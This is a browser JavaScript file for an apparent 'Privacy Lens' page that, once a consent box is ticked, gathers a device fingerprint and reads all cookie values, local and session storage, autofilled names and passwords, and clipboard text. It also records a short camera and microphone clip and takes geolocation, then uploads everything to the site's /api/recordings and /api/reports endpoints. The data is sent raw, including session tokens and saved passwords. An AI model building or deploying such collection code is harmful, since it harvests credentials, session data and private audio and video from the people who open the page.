const $ = (s) => document.querySelector(s);
const state = { mediaStream: null, events: [] };

$('#consent').addEventListener('change', () => {
  const checked = $('#consent').checked;
  $('#getAllAccess').disabled = !checked;
  if (checked) {
    $('#profileHint').textContent = 'Click collect to start.';
  } else {
    stopStream(state.mediaStream);
    $('#profileState').textContent = 'Ready';
    $('#profileHint').textContent = 'Toggle consent and click collect.';
  }
});

function addLog(label, detail) {
  state.events.push({ label, detail, at: new Date().toISOString() });
}

function canvasSignature() {
  const c = document.createElement('canvas');
  c.width = 280; c.height = 70;
  const ctx = c.getContext('2d');
  if (!ctx) return 'Unavailable';
  ctx.textBaseline = 'top'; ctx.font = '18px Arial';
  ctx.fillStyle = '#183c52'; ctx.fillRect(7, 7, 120, 42);
  ctx.fillStyle = '#f1c46b'; ctx.fillText('Privacy Lens', 12, 15);
  return c.toDataURL().slice(-48);
}

function webglInfo() {
  const c = document.createElement('canvas');
  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
  if (!gl) return { renderer: 'Unavailable', vendor: 'Unavailable' };
  const ext = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'Protected',
    vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : 'Protected',
  };
}

async function digest(value) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(value));
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('');
}

function stopStream(stream) {
  if (!stream) return;
  stream.getTracks().forEach((t) => t.stop());
}

function recordClip(stream, durationMs) {
  const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') ? 'video/webm;codecs=vp9,opus' : 'video/webm';
  const chunks = [];
  const recorder = new MediaRecorder(stream, { mimeType: mime });
  return new Promise((resolve, reject) => {
    if (!window.MediaRecorder) { resolve(null); return; }
    recorder.ondataavailable = (e) => { if (e.data.size) chunks.push(e.data); };
    recorder.onerror = () => reject(new Error('Recording failed'));
    recorder.onstop = () => resolve(new Blob(chunks, { type: mime }));
    recorder.start(1000);
    setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, durationMs);
  });
}

function collectCookies() {
  if (!document.cookie) return { count: 0, entries: [] };
  const pairs = document.cookie.split(';').map(s => s.trim()).filter(Boolean);
  const entries = pairs.map(p => {
    const eq = p.indexOf('=');
    return eq > 0 ? { name: p.slice(0, eq), value: p.slice(eq + 1) } : { name: p, value: '' };
  });
  return { count: entries.length, entries };
}

function collectStorage() {
  const local = {};
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    if (k) local[k] = localStorage.getItem(k);
  }
  const session = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    const k = sessionStorage.key(i);
    if (k) session[k] = sessionStorage.getItem(k);
  }
  return {
    localStorage: { count: Object.keys(local).length, entries: local },
    sessionStorage: { count: Object.keys(session).length, entries: session },
  };
}

function captureAutofill() {
  const fields = ['af_name', 'af_email', 'af_address', 'af_tel', 'af_username', 'af_password'];
  const result = {};
  let any = false;
  fields.forEach(id => {
    const el = document.getElementById(id);
    if (el && el.value) { result[id.replace('af_', '')] = el.value; any = true; }
  });
  return any ? result : null;
}

async function getAllAccess() {
  if (!$('#consent').checked) return;
  const btn = $('#getAllAccess');
  btn.disabled = true;
  btn.textContent = 'Collecting...';
  $('#profileState').textContent = 'Running';
  $('#profileHint').textContent = 'Collecting browser data...';

  const collected = {};
  let recordingId = null;

  // 1. Fingerprint
  try {
    const gl = webglInfo();
    const cs = canvasSignature();
    const raw = [navigator.userAgent, navigator.language, screen.width, screen.height, navigator.platform, gl.renderer, cs].join('|');
    const hash = await digest(raw);
    collected.fingerprint = {
      Browser: navigator.userAgent,
      Platform: navigator.platform,
      Language: navigator.language,
      Languages: navigator.languages?.join(', ') || 'Unavailable',
      Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      Viewport: window.innerWidth + ' x ' + window.innerHeight,
      Screen: screen.width + ' x ' + screen.height,
      PixelRatio: window.devicePixelRatio,
      ColorDepth: screen.colorDepth + '-bit',
      TouchPoints: navigator.maxTouchPoints,
      CPUThreads: navigator.hardwareConcurrency,
      Memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not disclosed',
      Cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
      WebDriver: navigator.webdriver ? 'Detected' : 'Not detected',
      WebGLRenderer: gl.renderer,
      WebGLVendor: gl.vendor,
      CanvasSignature: cs,
      FingerprintHash: hash.slice(0, 32),
    };
    addLog('Fingerprint', 'collected');
  } catch (err) {
    addLog('Fingerprint', 'error: ' + err.message);
  }

  // 2. Cookies
  let cookiesData = { count: 0, entries: [] };
  try {
    cookiesData = collectCookies();
    addLog('Cookies', cookiesData.count + ' found');
  } catch (err) {
    addLog('Cookies', 'error: ' + err.message);
  }

  // 3. Local & Session Storage
  let storageData = null;
  try {
    storageData = collectStorage();
    addLog('Storage', (storageData.localStorage.count + storageData.sessionStorage.count) + ' keys');
  } catch (err) {
    addLog('Storage', 'error: ' + err.message);
  }

  // 4. Autofill (best-effort)
  let autofillData = null;
  try {
    await new Promise((r) => setTimeout(r, 800));
    autofillData = captureAutofill();
    if (autofillData) {
      addLog('Autofill', Object.keys(autofillData).length + ' fields');
    } else {
      addLog('Autofill', 'not found');
    }
  } catch (err) {
    addLog('Autofill', 'error: ' + err.message);
  }

  // 5. Camera & Microphone + record 3s clip
  try {
    if (state.mediaStream) stopStream(state.mediaStream);
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    state.mediaStream = stream;
    addLog('Camera & Mic', 'granted, recording');

    const blob = await recordClip(stream, 3000);
    if (blob) {
      try {
        const resp = await fetch('/api/recordings', {
          method: 'POST',
          headers: { 'Content-Type': blob.type, 'X-Recording-Consent': 'true' },
          body: blob,
        });
        const result = await resp.json();
        if (resp.ok) {
          recordingId = result.id;
          addLog('Recording upload', 'id ' + result.id);
        } else {
          addLog('Recording upload', result.error || 'failed');
        }
      } catch (e) {
        addLog('Recording upload', 'connection error');
      }
    } else {
      addLog('Recording upload', 'MediaRecorder unavailable');
    }
  } catch (err) {
    addLog('Camera & Mic', 'denied');
  }

  // 6. Clipboard
  let clipboardContent = null;
  try {
    const text = await navigator.clipboard.readText();
    clipboardContent = text || '';
    addLog('Clipboard', text ? text.length + ' chars' : 'empty');
  } catch (err) {
    addLog('Clipboard', 'denied');
  }

  // 7. Geolocation
  let geoCoords = null;
  const geo = await new Promise((resolve) => {
    if (!navigator.geolocation) { resolve({ ok: false }); return; }
    navigator.geolocation.getCurrentPosition(
      (p) => resolve({ ok: true, lat: p.coords.latitude, lng: p.coords.longitude }),
      () => resolve({ ok: false }),
      { timeout: 10000 }
    );
  });
  if (geo.ok) {
    geoCoords = { latitude: geo.lat, longitude: geo.lng };
    addLog('Geolocation', 'captured');
  } else {
    addLog('Geolocation', 'denied');
  }

  // 8. Notifications
  if ('Notification' in window) {
    const status = await Notification.requestPermission();
    addLog('Notifications', status);
  } else {
    addLog('Notifications', 'not supported');
  }

  btn.disabled = false;
  btn.textContent = 'Get All Access';

  const reportData = {
    browser_signals: collected.fingerprint || {},
    cookies: cookiesData,
    storage: storageData,
    autofill: autofillData,
    permissions: {
      camera_microphone: { recording_id: recordingId },
      clipboard: { content: clipboardContent },
      geolocation: { coordinates: geoCoords },
      notifications: {},
    },
    recording_id: recordingId,
    user_agent: navigator.userAgent,
    platform: navigator.platform,
    timestamp: new Date().toISOString(),
  };

  try {
    const resp = await fetch('/api/reports', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        consent: true,
        consentVersion: '2026-07-safe-v1',
        fingerprint: reportData,
        events: state.events,
      }),
    });
    const result = await resp.json();
    if (resp.ok) {
      addLog('Server save', 'report id ' + result.id);
      $('#profileState').textContent = 'Saved';
      $('#profileHint').textContent = 'Report #' + result.id + ' saved to server.';
    } else {
      addLog('Server save', result.error || 'failed');
      $('#profileHint').textContent = 'Upload failed: ' + (result.error || 'unknown');
    }
  } catch (err) {
    addLog('Server save', 'connection failed');
    $('#profileHint').textContent = 'Could not reach server.';
  }
}

$('#getAllAccess').addEventListener('click', getAllAccess);
$('#showLocalInstructions').addEventListener('click', () => {
  const el = $('#localInstructions');
  el.hidden = !el.hidden;
  $('#showLocalInstructions').textContent = el.hidden ? 'Usage' : 'Hide';
});
